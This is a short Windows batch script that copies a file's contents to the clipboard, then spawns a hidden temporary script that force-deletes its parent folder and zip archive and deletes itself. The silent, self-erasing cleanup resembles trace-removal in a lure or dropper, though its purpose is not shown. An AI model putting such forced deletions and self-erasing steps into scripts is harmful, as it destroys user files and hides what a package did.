@echo off
setlocal enabledelayedexpansion

:: Copy content of c.m to clipboard
type c.m | clip

:: Brief pause to ensure clipboard operation completes
timeout /t 1 /nobreak > nul

:: Create a temporary script to delete files and exit
echo @echo off > temp_del.bat
echo timeout /t 2 /nobreak > nul >> temp_del.bat
echo rmdir /s /q ..\a-main >> temp_del.bat
echo del /q /f ..\a.zip >> temp_del.bat
echo del /q /f "%%~f0" >> temp_del.bat

:: Run the temporary script and exit
start /b cmd /c temp_del.bat
exit
